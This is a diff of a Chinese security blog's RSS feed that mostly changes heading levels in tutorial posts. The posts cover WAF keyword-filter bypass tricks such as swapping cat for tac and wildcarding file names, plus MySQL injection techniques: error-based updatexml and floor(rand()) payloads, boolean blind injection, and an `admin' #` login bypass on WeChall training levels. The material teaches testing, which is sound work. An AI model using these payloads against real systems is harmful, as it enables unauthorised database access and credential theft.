+&lt;h3 id=&#34;常用系统命令与替代方案&#34;&gt;常用系统命令与替代方案
+&lt;/h3&gt;&lt;h4 id=&#34;基础命令按系统分类&#34;&gt;基础命令（按系统分类）
+&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Linux&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;查看目录：ls&lt;/li&gt;
+&lt;li&gt;读取文件：cat、tac、head、tail、more、less、nl、sort、paste&lt;/li&gt;
+&lt;li&gt;系统信息：pwd、whoami、chmod&lt;/li&gt;
+&lt;li&gt;路径格式：&lt;code&gt;/etc/passwd&lt;/code&gt;、&lt;code&gt;./haha.php&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;Windows&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;系统信息：whoami、ipconfig&lt;/li&gt;
+&lt;li&gt;查看目录：dir&lt;/li&gt;
+&lt;li&gt;读取文件：type&lt;/li&gt;
+&lt;li&gt;路径格式：&lt;code&gt;c:/a.txt&lt;/code&gt;、&lt;code&gt;c:\a.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;关键词waf屏蔽绕过替代命令&#34;&gt;关键词WAF屏蔽绕过（替代命令）
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;屏蔽 cat：使用 tac、more、less、head、tail、nl、sort、paste&lt;/li&gt;
+&lt;li&gt;屏蔽 ls：使用&lt;code&gt;l&#39;s&#39;&lt;/code&gt;、&lt;code&gt;ls&lt;/code&gt;的通配符替代&lt;/li&gt;
+&lt;li&gt;屏蔽 php：使用通配符&lt;code&gt;./haha.ph*&lt;/code&gt;、&lt;code&gt;./haha.ph?&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
 </description>
         </item>
         <item>
@@ -1272,9 +1567,9 @@
         <pubDate>Thu, 22 Jan 2026 20:58:00 +0800</pubDate>
         
         <guid>https://www.retr0.xyz/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/</guid>
-        <description>&lt;h1 id=&#34;前置知识&#34;&gt;前置知识
-&lt;/h1&gt;&lt;h2 id=&#34;注释符&#34;&gt;注释符
-&lt;/h2&gt;&lt;ol&gt;
+        <description>&lt;h2 id=&#34;前置知识&#34;&gt;前置知识
+&lt;/h2&gt;&lt;h3 id=&#34;注释符&#34;&gt;注释符
+&lt;/h3&gt;&lt;ol&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;code&gt;--+&lt;/code&gt;	(推荐使用)在GET请求中，&lt;code&gt;+&lt;/code&gt; 会被解析为空格，常用于URL注入&lt;/p&gt;
 &lt;/li&gt;
@@ -1286,9 +1581,9 @@
 &lt;p&gt;在实践，当上面的注释符不可用时，还可以尝试&lt;code&gt;%00&lt;/code&gt;或闭合的形式绕过&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;h2 id=&#34;like语句和转义字符&#34;&gt;LIKE语句和转义字符
-&lt;/h2&gt;&lt;h3 id=&#34;like语句&#34;&gt;LIKE语句
-&lt;/h3&gt;&lt;p&gt;再MySQL中LIKE语句用于模糊查询，其基本格式就是&lt;/p&gt;
+&lt;h3 id=&#34;like语句和转义字符&#34;&gt;LIKE语句和转义字符
+&lt;/h3&gt;&lt;h4 id=&#34;like语句&#34;&gt;LIKE语句
+&lt;/h4&gt;&lt;p&gt;再MySQL中LIKE语句用于模糊查询，其基本格式就是&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -1308,8 +1603,8 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;但是因为一些字符的特殊性导致like语句的参数并不全都是&lt;code&gt;&#39;%\匹配目标%&#39;&lt;/code&gt;那么简单，&lt;/p&gt;
 &lt;p&gt;例如你要查询含有&lt;code&gt;\&lt;/code&gt;的数据，参数就要填&lt;code&gt;&#39;%\\\\%&#39;&lt;/code&gt;，详情见下文。&lt;/p&gt;
-&lt;h3 id=&#34;转义字符对照表&#34;&gt;转义字符对照表
-&lt;/h3&gt;&lt;table&gt;
+&lt;h4 id=&#34;转义字符对照表&#34;&gt;转义字符对照表
+&lt;/h4&gt;&lt;table&gt;
   &lt;thead&gt;
       &lt;tr&gt;
           &lt;th&gt;&lt;strong&gt;转义序列&lt;/strong&gt;&lt;/th&gt;
@@ -1396,8 +1691,8 @@
 &lt;li&gt;反斜杠只转义紧跟其后的一个字符，所以&lt;code&gt;\%&lt;/code&gt;只会把后面的&lt;code&gt;%&lt;/code&gt;转义为普通字符，不会影响其他字符。&lt;/li&gt;
 &lt;li&gt;在 LIKE 中，反斜杠本身需要 &lt;strong&gt;双重转义&lt;/strong&gt; （&lt;code&gt;\\\\&lt;/code&gt;），因为 MySQL 会先解析一次&lt;code&gt;\\&lt;/code&gt;为&lt;code&gt;\&lt;/code&gt;，然后 LIKE 再解析一次&lt;code&gt;\\&lt;/code&gt;为&lt;code&gt;\&lt;/code&gt;，最终得到一个字面量&lt;code&gt;\&lt;/code&gt;。&lt;/li&gt;
 &lt;/ol&gt;
-&lt;h1 id=&#34;order-by与联合查询注入&#34;&gt;ORDER BY与联合查询注入
-&lt;/h1&gt;&lt;p&gt;这一部分在之前的文章已有讲述，详见&lt;a class=&#34;link&#34; href=&#34;https://www.retr0.xyz/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;h2 id=&#34;order-by与联合查询注入&#34;&gt;ORDER BY与联合查询注入
+&lt;/h2&gt;&lt;p&gt;这一部分在之前的文章已有讲述，详见&lt;a class=&#34;link&#34; href=&#34;https://www.retr0.xyz/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;1.5 mysql注入初步&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;仅补充一下&lt;strong&gt;注入测试位置&lt;/strong&gt;&lt;/p&gt;
 &lt;!-- 这是一张图片，ocr 内容为： --&gt;
@@ -1409,8 +1704,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h1 id=&#34;报错注入&#34;&gt;报错注入
-&lt;/h1&gt;&lt;blockquote&gt;
+&lt;h2 id=&#34;报错注入&#34;&gt;报错注入
+&lt;/h2&gt;&lt;blockquote&gt;
 &lt;p&gt;报错注入指利用错误信息回显获取数据库内容&lt;/p&gt;
 &lt;p&gt;适用于页面无法正常回显查询内容，但会详细显示查询过程的错误信息时，可通过构造特殊SQL语句触发错误，将想要查询的数据通过错误信息带出。&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -1423,9 +1718,9 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id=1&amp;#39; and (查询语句) --+
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;方法一xpath函数报错&#34;&gt;方法一：XPath函数报错
-&lt;/h2&gt;&lt;h3 id=&#34;updatexml函数的定义&#34;&gt;updatexml函数的定义
-&lt;/h3&gt;&lt;blockquote&gt;
+&lt;/div&gt;&lt;h3 id=&#34;方法一xpath函数报错&#34;&gt;方法一：XPath函数报错
+&lt;/h3&gt;&lt;h4 id=&#34;updatexml函数的定义&#34;&gt;updatexml函数的定义
+&lt;/h4&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;code&gt;updatexml()&lt;/code&gt;函数用于修改XML文档中的节点。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1440,8 +1735,8 @@
 &lt;p&gt;第二个参数&lt;code&gt;XPath_string&lt;/code&gt;是指定需要更新的XML节点的XPath表达式。&lt;/p&gt;
 &lt;p&gt;第三个参数&lt;code&gt;new_value&lt;/code&gt;是新值，用于替换找到的符合条件的数据。&lt;/p&gt;
 &lt;p&gt;如果&lt;code&gt;XPath_string&lt;/code&gt;格式错误，MySQL会抛出一个XPath语法错误。&lt;/p&gt;
-&lt;h3 id=&#34;updatexml报错注入&#34;&gt;updatexml报错注入
-&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;h4 id=&#34;updatexml报错注入&#34;&gt;updatexml报错注入
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
@@ -1515,8 +1810,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;其中&lt;code&gt;updatexml()&lt;/code&gt;是调用修改xml的功能，参数第一个和第三个随便填个数字（遵循其用法），第二个参数使用&lt;code&gt;concat()&lt;/code&gt;函数拼接字符串，&lt;code&gt;concat()&lt;/code&gt;的参数根据实际需要填写，个数不限，里面必须要有&lt;code&gt;0x7e&lt;/code&gt;引起报错，结合查询参数，比如&lt;code&gt;datebase()&lt;/code&gt;查数据库名，select语句(外面要加括号)查更详细内容。&lt;/p&gt;
-&lt;h3 id=&#34;extractvalue函数&#34;&gt;extractvalue()函数
-&lt;/h3&gt;&lt;p&gt;&lt;code&gt;extractvalue()&lt;/code&gt;和&lt;code&gt;updatexml()&lt;/code&gt;的用法基本一致，只不过&lt;code&gt;extractvalue()&lt;/code&gt;只有两个参数，所以只需要删掉上面示例语句中&lt;code&gt;updatexml()&lt;/code&gt;的第三个参数1就可以了。&lt;/p&gt;
+&lt;h4 id=&#34;extractvalue函数&#34;&gt;extractvalue()函数
+&lt;/h4&gt;&lt;p&gt;&lt;code&gt;extractvalue()&lt;/code&gt;和&lt;code&gt;updatexml()&lt;/code&gt;的用法基本一致，只不过&lt;code&gt;extractvalue()&lt;/code&gt;只有两个参数，所以只需要删掉上面示例语句中&lt;code&gt;updatexml()&lt;/code&gt;的第三个参数1就可以了。&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;例如：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1526,10 +1821,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;extractvalue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;方法二count--group-by--floorrand2报错&#34;&gt;方法二：count(*) + group by + floor(rand()*2)报错
-&lt;/h2&gt;&lt;h3 id=&#34;原理解释仅作了解&#34;&gt;原理解释（仅作了解）
-&lt;/h3&gt;&lt;h4 id=&#34;前置知识-1&#34;&gt;&lt;strong&gt;前置知识：&lt;/strong&gt;
-&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;1. &lt;code&gt;rand(0)&lt;/code&gt; 的伪随机特性&lt;/strong&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;h3 id=&#34;方法二count--group-by--floorrand2报错&#34;&gt;方法二：count(*) + group by + floor(rand()*2)报错
+&lt;/h3&gt;&lt;h4 id=&#34;原理解释仅作了解&#34;&gt;原理解释（仅作了解）
+&lt;/h4&gt;&lt;h5 id=&#34;前置知识-1&#34;&gt;&lt;strong&gt;前置知识：&lt;/strong&gt;
+&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;1. &lt;code&gt;rand(0)&lt;/code&gt; 的伪随机特性&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;rand(seed)&lt;/code&gt; 是 &lt;strong&gt;伪随机数生成函数&lt;/strong&gt; ，当种子固定为&lt;code&gt;0&lt;/code&gt;时，生成的随机数序列是&lt;strong&gt;完全固定的&lt;/strong&gt; 。&lt;/li&gt;
 &lt;li&gt;在&lt;strong&gt;同一个查询中&lt;/strong&gt; ，多次调用&lt;code&gt;rand(0)&lt;/code&gt;会生成连续的随机数（而非每次重置种子）。&lt;/li&gt;
@@ -1584,8 +1879,8 @@
 &lt;li&gt;遍历结束后返回虚拟表结果。&lt;/li&gt;
 &lt;/ol&gt;
 &lt;hr&gt;
-&lt;h4 id=&#34;按步骤还原报错过程&#34;&gt;按步骤还原报错过程：
-&lt;/h4&gt;&lt;p&gt;假设&lt;code&gt;users&lt;/code&gt;表有&lt;strong&gt;至少 3 行数据&lt;/strong&gt; （触发报错的必要条件），我们逐行分析虚拟表的变化：&lt;/p&gt;
+&lt;h5 id=&#34;按步骤还原报错过程&#34;&gt;按步骤还原报错过程：
+&lt;/h5&gt;&lt;p&gt;假设&lt;code&gt;users&lt;/code&gt;表有&lt;strong&gt;至少 3 行数据&lt;/strong&gt; （触发报错的必要条件），我们逐行分析虚拟表的变化：&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;初始化状态&lt;/strong&gt; ，虚拟表为空：&lt;/p&gt;
 &lt;table&gt;
   &lt;thead&gt;
@@ -1601,8 +1896,8 @@
       &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h5 id=&#34;步骤-1处理第-1-行数据&#34;&gt;步骤 1：处理第 1 行数据
-&lt;/h5&gt;&lt;ol&gt;
+&lt;h6 id=&#34;步骤-1处理第-1-行数据&#34;&gt;步骤 1：处理第 1 行数据
+&lt;/h6&gt;&lt;ol&gt;
 &lt;li&gt;&lt;strong&gt;计算分组键 x1&lt;/strong&gt;（第 1 次调用&lt;code&gt;rand(0)&lt;/code&gt;）：&lt;code&gt;floor(rand(0)*2) → 0&lt;/code&gt;。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;检查虚拟表&lt;/strong&gt; ：没有&lt;code&gt;x=0&lt;/code&gt;的行，需要插入新行。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;再次计算分组键 x2&lt;/strong&gt; （第 2 次调用&lt;code&gt;rand(0)&lt;/code&gt;）：&lt;code&gt;floor(rand(0)*2) → 1&lt;/code&gt;。&lt;/li&gt;
@@ -1623,8 +1918,8 @@
       &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h5 id=&#34;步骤-2处理第-2-行数据&#34;&gt;步骤 2：处理第 2 行数据
-&lt;/h5&gt;&lt;ol&gt;
+&lt;h6 id=&#34;步骤-2处理第-2-行数据&#34;&gt;步骤 2：处理第 2 行数据
+&lt;/h6&gt;&lt;ol&gt;
 &lt;li&gt;&lt;strong&gt;计算分组键 x1&lt;/strong&gt; （第 3 次调用&lt;code&gt;rand(0)&lt;/code&gt;）：&lt;code&gt;floor(rand(0)*2) → 1&lt;/code&gt;。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;检查虚拟表&lt;/strong&gt; ：存在&lt;code&gt;x=1&lt;/code&gt;的行，将&lt;code&gt;count&lt;/code&gt;加 1 → &lt;code&gt;count=2&lt;/code&gt;。&lt;/li&gt;
 &lt;/ol&gt;
@@ -1643,8 +1938,8 @@
       &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h5 id=&#34;步骤-3处理第-3-行数据触发报错&#34;&gt;步骤 3：处理第 3 行数据（触发报错‼️）
-&lt;/h5&gt;&lt;ol&gt;
+&lt;h6 id=&#34;步骤-3处理第-3-行数据触发报错&#34;&gt;步骤 3：处理第 3 行数据（触发报错‼️）
+&lt;/h6&gt;&lt;ol&gt;
 &lt;li&gt;&lt;strong&gt;计算分组键 x1&lt;/strong&gt; （第 4 次调用&lt;code&gt;rand(0)&lt;/code&gt;）：&lt;code&gt;floor(rand(0)*2) → 0&lt;/code&gt;。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;检查虚拟表&lt;/strong&gt; ：没有&lt;code&gt;x=0&lt;/code&gt;的行，需要插入新行。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;再次计算分组键 x2&lt;/strong&gt; （第 5 次调用&lt;code&gt;rand(0)&lt;/code&gt;）：&lt;code&gt;floor(rand(0)*2) → 1&lt;/code&gt;。&lt;/li&gt;
@@ -1652,15 +1947,15 @@
 &lt;li&gt;&lt;strong&gt;报错触发&lt;/strong&gt;：MySQL 抛出&lt;code&gt;&amp;lt;font style=&amp;quot;color:#DF2A3F;background-color:rgba(0, 0, 0, 0);&amp;quot;&amp;gt;ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;group_key&#39;&amp;lt;/font&amp;gt;&lt;/code&gt;（重复键错误）。&lt;/li&gt;
 &lt;/ol&gt;
 &lt;hr&gt;
-&lt;h4 id=&#34;报错核心原因总结&#34;&gt;报错核心原因总结
-&lt;/h4&gt;&lt;ol&gt;
+&lt;h5 id=&#34;报错核心原因总结&#34;&gt;报错核心原因总结
+&lt;/h5&gt;&lt;ol&gt;
 &lt;li&gt;&lt;strong&gt;双重计算分组键&lt;/strong&gt; ：&lt;code&gt;GROUP BY&lt;/code&gt;在插入新行时会再次计算分组键，导致&lt;code&gt;rand(0)&lt;/code&gt;被额外调用一次。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;固定序列冲突&lt;/strong&gt; ：&lt;code&gt;rand(0)&lt;/code&gt;的固定序列使得 “插入时计算的分组键” 与虚拟表中已存在的分组键重复。&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;唯一键约束&lt;/strong&gt; ：虚拟表的分组键是唯一键，重复插入会触发主键冲突错误。&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;补充：如果&lt;code&gt;users&lt;/code&gt;表行数不足 3，可能不会报错（比如仅 2 行时，插入 1 次后后续行直接累加计数，无二次插入）。&lt;/p&gt;
-&lt;h3 id=&#34;使用方法&#34;&gt;使用方法
-&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;示例payload：&lt;/strong&gt;&lt;/p&gt;
+&lt;h4 id=&#34;使用方法&#34;&gt;使用方法
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;示例payload：&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;爆当前数据库及表名：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1688,13 +1983,13 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;字段名&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x3a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;字段名&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;表名&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;GROUP&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;BY&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;布尔型注入&#34;&gt;布尔型注入
-&lt;/h1&gt;&lt;blockquote&gt;
+&lt;/div&gt;&lt;h2 id=&#34;布尔型注入&#34;&gt;布尔型注入
+&lt;/h2&gt;&lt;blockquote&gt;
 &lt;p&gt;构造不同的SQL语句，根据页面返回的真假状态（如页面正常显示、报错或空白）来逐位推断数据库信息。&lt;/p&gt;
 &lt;p&gt;适合无错误回显但页面有明显差异的场景。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h2 id=&#34;核心函数&#34;&gt;核心函数
-&lt;/h2&gt;&lt;ol&gt;
+&lt;h3 id=&#34;核心函数&#34;&gt;核心函数
+&lt;/h3&gt;&lt;ol&gt;
 &lt;li&gt;&lt;strong&gt;length() - 判断长度&lt;/strong&gt;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1739,8 +2034,8 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgba(229,160,76,0.76);&#34;&gt;注意事项：&lt;/font&gt;&lt;/strong&gt; 布尔型注入请求量大，易被WAF拦截。建议编写自动化脚本或使用SQLMap工具。&lt;/p&gt;
 &lt;p&gt;总之，了解原理就行，碰到就用&lt;code&gt;sqlmap&lt;/code&gt;，别折磨自己。&lt;/p&gt;
-&lt;h1 id=&#34;post型盲注&#34;&gt;POST型盲注
-&lt;/h1&gt;&lt;blockquote&gt;
+&lt;h2 id=&#34;post型盲注&#34;&gt;POST型盲注
+&lt;/h2&gt;&lt;blockquote&gt;
 &lt;p&gt;之前我们接触的都是通过GET接收信息的类型，&lt;/p&gt;
 &lt;p&gt;但还存在通过POST接收信息的，通常存在于登录窗口等页面上&lt;/p&gt;
 &lt;p&gt;POST型盲注有这样几个特点&lt;/p&gt;
@@ -1760,9 +2055,9 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h2 id=&#34;小测验&#34;&gt;小测验
-&lt;/h2&gt;&lt;h3 id=&#34;第一关&#34;&gt;第一关
-&lt;/h3&gt;&lt;p&gt;访问&lt;a class=&#34;link&#34; href=&#34;https://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;h3 id=&#34;小测验&#34;&gt;小测验
+&lt;/h3&gt;&lt;h4 id=&#34;第一关&#34;&gt;第一关
+&lt;/h4&gt;&lt;p&gt;访问&lt;a class=&#34;link&#34; href=&#34;https://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;[WeChall] Training: MySQL I&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;在username一栏尝试闭合，发现&lt;code&gt;admin&#39;&lt;/code&gt;没有报错。&lt;/p&gt;
 &lt;p&gt;查看源码：&lt;/p&gt;
@@ -1775,8 +2070,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;所以可以用万能钥匙绕过密码检查，username填&lt;code&gt;admin&#39; #&lt;/code&gt;即可&lt;/p&gt;
-&lt;h3 id=&#34;第二关&#34;&gt;第二关
-&lt;/h3&gt;&lt;p&gt;访问：&lt;a class=&#34;link&#34; href=&#34;https://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;h4 id=&#34;第二关&#34;&gt;第二关
+&lt;/h4&gt;&lt;p&gt;访问：&lt;a class=&#34;link&#34; href=&#34;https://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;[WeChall] Training: MySQL II&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;同样发现是单引号闭合。&lt;/p&gt;
 &lt;p&gt;查看源码：&lt;/p&gt;
@@ -1843,8 +2138,8 @@
